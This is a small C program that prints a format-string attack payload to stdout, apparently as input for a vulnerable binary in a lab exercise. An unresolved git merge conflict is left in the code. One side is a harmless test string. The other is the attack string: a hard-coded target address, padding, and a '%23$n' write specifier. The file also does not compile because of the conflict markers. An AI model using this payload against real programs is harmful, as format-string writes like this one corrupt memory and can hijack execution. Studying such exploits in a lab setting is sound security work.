#include <stdio.h>
#include <string.h>

<<<<<<< HEAD:format_string_benign.c
char attackString [] = "sophie\nsophie\n"; 
=======
//0x0804a02a
char attackString[] = "\x2a\xa0\x04\x08                                                             %23$n\nsophie\n\n";
>>>>>>> 5e08ba682787344f94626c2eb51b309cf74df692:gen_formatstring.c
int main(){
	char *p = attackString;
	for(int i = 0; i <sizeof(attackString); i++){
		putchar(*p);
		p++;
		
	}
	return 0;
}

